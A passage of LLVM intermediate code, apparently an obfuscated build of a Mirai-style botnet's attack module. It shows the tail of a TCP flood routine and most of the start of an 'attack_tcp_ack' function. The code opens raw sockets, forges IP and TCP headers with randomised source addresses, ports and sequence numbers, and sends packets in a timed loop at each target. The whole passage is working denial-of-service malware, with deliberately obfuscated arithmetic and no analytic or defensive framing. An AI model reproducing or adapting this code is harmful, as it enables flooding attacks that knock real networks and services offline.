  store i8* %464, i8** %32, align 8
  store i8 8, i8* %463, align 1
  %465 = load i8*, i8** %32, align 8
  %466 = getelementptr inbounds i8, i8* %465, i32 1
  store i8* %466, i8** %32, align 8
  store i8 10, i8* %465, align 1
  %467 = call i32 @rand_next()
  %468 = load i8*, i8** %32, align 8
  %469 = bitcast i8* %468 to i32*
  store i32 %467, i32* %469, align 4
  %470 = load i8*, i8** %32, align 8
  %471 = getelementptr inbounds i8, i8* %470, i64 4
  store i8* %471, i8** %32, align 8
  %472 = load i8*, i8** %32, align 8
  %473 = bitcast i8* %472 to i32*
  store i32 0, i32* %473, align 4
  %474 = load i8*, i8** %32, align 8
  %475 = getelementptr inbounds i8, i8* %474, i64 4
  store i8* %475, i8** %32, align 8
  %476 = load i8*, i8** %32, align 8
  %477 = getelementptr inbounds i8, i8* %476, i32 1
  store i8* %477, i8** %32, align 8
  store i8 1, i8* %476, align 1
  %478 = load i8*, i8** %32, align 8
  %479 = getelementptr inbounds i8, i8* %478, i32 1
  store i8* %479, i8** %32, align 8
  store i8 3, i8* %478, align 1
  %480 = load i8*, i8** %32, align 8
  %481 = getelementptr inbounds i8, i8* %480, i32 1
  store i8* %481, i8** %32, align 8
  store i8 3, i8* %480, align 1
  %482 = load i8*, i8** %32, align 8
  %483 = getelementptr inbounds i8, i8* %482, i32 1
  store i8* %483, i8** %32, align 8
  store i8 6, i8* %482, align 1
  br label %484

; <label>:484:                                    ; preds = %208
  %485 = load i32, i32* %11, align 4
  %486 = sub i32 0, %485
  %487 = sub i32 0, 1
  %488 = add i32 %486, %487
  %489 = sub i32 0, %488
  %490 = add nsw i32 %485, 1
  store i32 %489, i32* %11, align 4
  br label %120

; <label>:491:                                    ; preds = %120
  br label %492

; <label>:492:                                    ; preds = %671, %491
  store i32 0, i32* %11, align 4
  br label %493

; <label>:493:                                    ; preds = %659, %492
  %494 = load i32, i32* %11, align 4
  %495 = load i8, i8* %7, align 1
  %496 = zext i8 %495 to i32
  %497 = icmp slt i32 %494, %496
  br i1 %497, label %498, label %665

; <label>:498:                                    ; preds = %493
  %499 = load i8**, i8*** %13, align 8
  %500 = load i32, i32* %11, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds i8*, i8** %499, i64 %501
  %503 = load i8*, i8** %502, align 8
  store i8* %503, i8** %33, align 8
  %504 = load i8*, i8** %33, align 8
  %505 = bitcast i8* %504 to %struct.iphdr*
  store %struct.iphdr* %505, %struct.iphdr** %34, align 8
  %506 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i64 1
  %508 = bitcast %struct.iphdr* %507 to %struct.tcphdr*
  store %struct.tcphdr* %508, %struct.tcphdr** %35, align 8
  %509 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %510 = load i32, i32* %11, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %509, i64 %511
  %513 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i32 0, i32 2
  %514 = load i8, i8* %513, align 4
  %515 = zext i8 %514 to i32
  %516 = icmp slt i32 %515, 32
  br i1 %516, label %517, label %541

; <label>:517:                                    ; preds = %498
  %518 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %519 = load i32, i32* %11, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i64 %520
  %522 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i32 0, i32 1
  %523 = load i32, i32* %522, align 4
  %524 = call i32 @ntohl(i32 %523) #7
  %525 = call i32 @rand_next()
  %526 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %527 = load i32, i32* %11, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %526, i64 %528
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i32 0, i32 2
  %531 = load i8, i8* %530, align 4
  %532 = zext i8 %531 to i32
  %533 = lshr i32 %525, %532
  %534 = sub i32 %524, 1928894751
  %535 = add i32 %534, %533
  %536 = add i32 %535, 1928894751
  %537 = add i32 %524, %533
  %538 = call i32 @htonl(i32 %536) #7
  %539 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 9
  store i32 %538, i32* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %517, %498
  %542 = load i32, i32* %28, align 4
  %543 = icmp eq i32 %542, -1
  br i1 %543, label %544, label %548

; <label>:544:                                    ; preds = %541
  %545 = call i32 @rand_next()
  %546 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 8
  store i32 %545, i32* %547, align 4
  br label %548

; <label>:548:                                    ; preds = %544, %541
  %549 = load i16, i16* %15, align 2
  %550 = zext i16 %549 to i32
  %551 = icmp eq i32 %550, 65535
  br i1 %551, label %552, label %561

; <label>:552:                                    ; preds = %548
  %553 = call i32 @rand_next()
  %554 = xor i32 65535, -1
  %555 = xor i32 %553, %554
  %556 = and i32 %555, %553
  %557 = and i32 %553, 65535
  %558 = trunc i32 %556 to i16
  %559 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %560 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %559, i32 0, i32 3
  store i16 %558, i16* %560, align 4
  br label %561

; <label>:561:                                    ; preds = %552, %548
  %562 = load i16, i16* %18, align 2
  %563 = zext i16 %562 to i32
  %564 = icmp eq i32 %563, 65535
  br i1 %564, label %565, label %578

; <label>:565:                                    ; preds = %561
  %566 = call i32 @rand_next()
  %567 = xor i32 %566, -1
  %568 = xor i32 65535, -1
  %569 = xor i32 -1392335667, -1
  %570 = or i32 %567, %568
  %571 = or i32 -1392335667, %569
  %572 = xor i32 %570, -1
  %573 = and i32 %572, %571
  %574 = and i32 %566, 65535
  %575 = trunc i32 %573 to i16
  %576 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 0
  store i16 %575, i16* %577, align 4
  br label %578

; <label>:578:                                    ; preds = %565, %561
  %579 = load i16, i16* %19, align 2
  %580 = zext i16 %579 to i32
  %581 = icmp eq i32 %580, 65535
  br i1 %581, label %582, label %591

; <label>:582:                                    ; preds = %578
  %583 = call i32 @rand_next()
  %584 = xor i32 65535, -1
  %585 = xor i32 %583, %584
  %586 = and i32 %585, %583
  %587 = and i32 %583, 65535
  %588 = trunc i32 %586 to i16
  %589 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 1
  store i16 %588, i16* %590, align 2
  br label %591

; <label>:591:                                    ; preds = %582, %578
  %592 = load i32, i32* %20, align 4
  %593 = icmp eq i32 %592, 65535
  br i1 %593, label %594, label %598

; <label>:594:                                    ; preds = %591
  %595 = call i32 @rand_next()
  %596 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 2
  store i32 %595, i32* %597, align 4
  br label %598

; <label>:598:                                    ; preds = %594, %591
  %599 = load i32, i32* %21, align 4
  %600 = icmp eq i32 %599, 65535
  br i1 %600, label %601, label %605

; <label>:601:                                    ; preds = %598
  %602 = call i32 @rand_next()
  %603 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %604 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %603, i32 0, i32 3
  store i32 %602, i32* %604, align 4
  br label %605

; <label>:605:                                    ; preds = %601, %598
  %606 = load i8, i8* %22, align 1
  %607 = icmp ne i8 %606, 0
  br i1 %607, label %608, label %621

; <label>:608:                                    ; preds = %605
  %609 = call i32 @rand_next()
  %610 = xor i32 %609, -1
  %611 = xor i32 65535, -1
  %612 = xor i32 1818125616, -1
  %613 = or i32 %610, %611
  %614 = or i32 1818125616, %612
  %615 = xor i32 %613, -1
  %616 = and i32 %615, %614
  %617 = and i32 %609, 65535
  %618 = trunc i32 %616 to i16
  %619 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %620 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %619, i32 0, i32 7
  store i16 %618, i16* %620, align 2
  br label %621

; <label>:621:                                    ; preds = %608, %605
  %622 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %623 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %622, i32 0, i32 7
  store i16 0, i16* %623, align 2
  %624 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %625 = bitcast %struct.iphdr* %624 to i16*
  %626 = call zeroext i16 @checksum_generic(i16* %625, i32 20)
  %627 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %628 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %627, i32 0, i32 7
  store i16 %626, i16* %628, align 2
  %629 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %630 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %629, i32 0, i32 6
  store i16 0, i16* %630, align 4
  %631 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %632 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %633 = bitcast %struct.tcphdr* %632 to i8*
  %634 = call zeroext i16 @htons(i16 zeroext 40) #7
  %635 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %631, i8* %633, i16 zeroext %634, i32 40)
  %636 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %637 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %636, i32 0, i32 6
  store i16 %635, i16* %637, align 4
  %638 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %639 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %638, i32 0, i32 1
  %640 = load i16, i16* %639, align 2
  %641 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %642 = load i32, i32* %11, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %641, i64 %643
  %645 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %644, i32 0, i32 0
  %646 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %645, i32 0, i32 1
  store i16 %640, i16* %646, align 2
  %647 = load i32, i32* %12, align 4
  %648 = load i8*, i8** %33, align 8
  %649 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %650 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %651 = load i32, i32* %11, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %650, i64 %652
  %654 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %653, i32 0, i32 0
  %655 = bitcast %struct.sockaddr_in* %654 to %struct.sockaddr*
  store %struct.sockaddr* %655, %struct.sockaddr** %649, align 8
  %656 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %657 = load %struct.sockaddr*, %struct.sockaddr** %656, align 8
  %658 = call i64 @sendto(i32 %647, i8* %648, i64 60, i32 16384, %struct.sockaddr* %657, i32 16)
  br label %659

; <label>:659:                                    ; preds = %621
  %660 = load i32, i32* %11, align 4
  %661 = sub i32 %660, 285230208
  %662 = add i32 %661, 1
  %663 = add i32 %662, 285230208
  %664 = add nsw i32 %660, 1
  store i32 %663, i32* %11, align 4
  br label %493

; <label>:665:                                    ; preds = %493
  %666 = call i64 @time(i64* null) #6
  %667 = load i32, i32* %29, align 4
  %668 = sext i32 %667 to i64
  %669 = icmp sgt i64 %666, %668
  br i1 %669, label %670, label %671

; <label>:670:                                    ; preds = %665
  br label %672

; <label>:671:                                    ; preds = %665
  br label %492

; <label>:672:                                    ; preds = %670, %116, %110
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 19, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = sub i64 %109, -3965770437388178450
  %113 = add i64 %112, %111
  %114 = add i64 %113, -3965770437388178450
  %115 = add nsw i64 %109, %111
  %116 = trunc i64 %114 to i32
  store i32 %116, i32* %31, align 4
  %117 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %117, i32* %12, align 4
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %119, label %120

; <label>:119:                                    ; preds = %5
  br label %679

; <label>:120:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %121 = load i32, i32* %12, align 4
  %122 = bitcast i32* %11 to i8*
  %123 = call i32 @setsockopt(i32 %121, i32 0, i32 3, i8* %122, i32 4) #6
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %128

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* %12, align 4
  %127 = call i32 @close(i32 %126)
  br label %679

; <label>:128:                                    ; preds = %120
  store i32 0, i32* %11, align 4
  br label %129

; <label>:129:                                    ; preds = %477, %128
  %130 = load i32, i32* %11, align 4
  %131 = load i8, i8* %7, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp slt i32 %130, %132
  br i1 %133, label %134, label %483

; <label>:134:                                    ; preds = %129
  %135 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %136 = load i8**, i8*** %13, align 8
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8*, i8** %136, i64 %138
  store i8* %135, i8** %139, align 8
  %140 = load i8**, i8*** %13, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8*, i8** %140, i64 %142
  %144 = load i8*, i8** %143, align 8
  %145 = bitcast i8* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %32, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i64 1
  %148 = bitcast %struct.iphdr* %147 to %struct.tcphdr*
  store %struct.tcphdr* %148, %struct.tcphdr** %33, align 8
  %149 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i64 1
  %151 = bitcast %struct.tcphdr* %150 to i8*
  store i8* %151, i8** %34, align 8
  %152 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = xor i8 15, -1
  %156 = xor i8 %154, %155
  %157 = and i8 %156, %154
  %158 = and i8 %154, 15
  %159 = and i8 %157, 64
  %160 = xor i8 %157, 64
  %161 = or i8 %159, %160
  %162 = or i8 %157, 64
  store i8 %161, i8* %153, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %164 = bitcast %struct.iphdr* %163 to i8*
  %165 = load i8, i8* %164, align 4
  %166 = xor i8 %165, -1
  %167 = xor i8 -16, -1
  %168 = xor i8 -66, -1
  %169 = or i8 %166, %167
  %170 = or i8 -66, %168
  %171 = xor i8 %169, -1
  %172 = and i8 %171, %170
  %173 = and i8 %165, -16
  %174 = and i8 %172, 5
  %175 = xor i8 %172, 5
  %176 = or i8 %174, %175
  %177 = or i8 %172, 5
  store i8 %176, i8* %164, align 4
  %178 = load i8, i8* %14, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 1
  store i8 %178, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = sext i32 %181 to i64
  %183 = sub i64 0, 40
  %184 = sub i64 0, %182
  %185 = add i64 %183, %184
  %186 = sub i64 0, %185
  %187 = add i64 40, %182
  %188 = trunc i64 %186 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %15, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 3
  store i16 %193, i16* %195, align 4
  %196 = load i8, i8* %16, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 5
  store i8 %196, i8* %198, align 4
  %199 = load i8, i8* %17, align 1
  %200 = icmp ne i8 %199, 0
  br i1 %200, label %201, label %205

; <label>:201:                                    ; preds = %134
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  br label %205

; <label>:205:                                    ; preds = %201, %134
  %206 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 6, i8* %207, align 1
  %208 = load i32, i32* %30, align 4
  %209 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %212 = load i32, i32* %11, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i64 %213
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i32 0, i32 1
  %216 = load i32, i32* %215, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  store i32 %216, i32* %218, align 4
  %219 = load i16, i16* %18, align 2
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 0
  store i16 %220, i16* %222, align 4
  %223 = load i16, i16* %19, align 2
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 1
  store i16 %224, i16* %226, align 2
  %227 = load i32, i32* %20, align 4
  %228 = trunc i32 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = zext i16 %229 to i32
  %231 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 2
  store i32 %230, i32* %232, align 4
  %233 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = xor i16 %235, -1
  %237 = xor i16 -241, -1
  %238 = xor i16 7667, -1
  %239 = or i16 %236, %237
  %240 = or i16 7667, %238
  %241 = xor i16 %239, -1
  %242 = and i16 %241, %240
  %243 = and i16 %235, -241
  %244 = and i16 %242, 80
  %245 = xor i16 %242, 80
  %246 = or i16 %244, %245
  %247 = or i16 %242, 80
  store i16 %246, i16* %234, align 4
  %248 = load i8, i8* %22, align 1
  %249 = sext i8 %248 to i16
  %250 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = xor i16 1, -1
  %254 = xor i16 %249, %253
  %255 = and i16 %254, %249
  %256 = and i16 %249, 1
  %257 = shl i16 %255, 13
  %258 = xor i16 %252, -1
  %259 = xor i16 -8193, -1
  %260 = xor i16 29797, -1
  %261 = or i16 %258, %259
  %262 = or i16 29797, %260
  %263 = xor i16 %261, -1
  %264 = and i16 %263, %262
  %265 = and i16 %252, -8193
  %266 = xor i16 %264, -1
  %267 = xor i16 %257, -1
  %268 = xor i16 16872, -1
  %269 = and i16 %266, 16872
  %270 = and i16 %264, %268
  %271 = and i16 %267, 16872
  %272 = and i16 %257, %268
  %273 = or i16 %269, %270
  %274 = or i16 %271, %272
  %275 = xor i16 %273, %274
  %276 = or i16 %266, %267
  %277 = xor i16 %276, -1
  %278 = or i16 16872, %268
  %279 = and i16 %277, %278
  %280 = or i16 %275, %279
  %281 = or i16 %264, %257
  store i16 %280, i16* %251, align 4
  %282 = load i8, i8* %23, align 1
  %283 = sext i8 %282 to i16
  %284 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 4
  %286 = load i16, i16* %285, align 4
  %287 = xor i16 %283, -1
  %288 = xor i16 1, -1
  %289 = xor i16 -31298, -1
  %290 = or i16 %287, %288
  %291 = or i16 -31298, %289
  %292 = xor i16 %290, -1
  %293 = and i16 %292, %291
  %294 = and i16 %283, 1
  %295 = shl i16 %293, 12
  %296 = xor i16 %286, -1
  %297 = xor i16 -4097, -1
  %298 = xor i16 -13760, -1
  %299 = or i16 %296, %297
  %300 = or i16 -13760, %298
  %301 = xor i16 %299, -1
  %302 = and i16 %301, %300
  %303 = and i16 %286, -4097
  %304 = xor i16 %302, -1
  %305 = xor i16 %295, -1
  %306 = xor i16 -15881, -1
  %307 = and i16 %304, -15881
  %308 = and i16 %302, %306
  %309 = and i16 %305, -15881
  %310 = and i16 %295, %306
  %311 = or i16 %307, %308
  %312 = or i16 %309, %310
  %313 = xor i16 %311, %312
  %314 = or i16 %304, %305
  %315 = xor i16 %314, -1
  %316 = or i16 -15881, %306
  %317 = and i16 %315, %316
  %318 = or i16 %313, %317
  %319 = or i16 %302, %295
  store i16 %318, i16* %285, align 4
  %320 = load i8, i8* %24, align 1
  %321 = sext i8 %320 to i16
  %322 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %323 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %322, i32 0, i32 4
  %324 = load i16, i16* %323, align 4
  %325 = xor i16 %321, -1
  %326 = xor i16 1, -1
  %327 = xor i16 -15836, -1
  %328 = or i16 %325, %326
  %329 = or i16 -15836, %327
  %330 = xor i16 %328, -1
  %331 = and i16 %330, %329
  %332 = and i16 %321, 1
  %333 = shl i16 %331, 11
  %334 = xor i16 -2049, -1
  %335 = xor i16 %324, %334
  %336 = and i16 %335, %324
  %337 = and i16 %324, -2049
  %338 = and i16 %336, %333
  %339 = xor i16 %336, %333
  %340 = or i16 %338, %339
  %341 = or i16 %336, %333
  store i16 %340, i16* %323, align 4
  %342 = load i8, i8* %25, align 1
  %343 = sext i8 %342 to i16
  %344 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
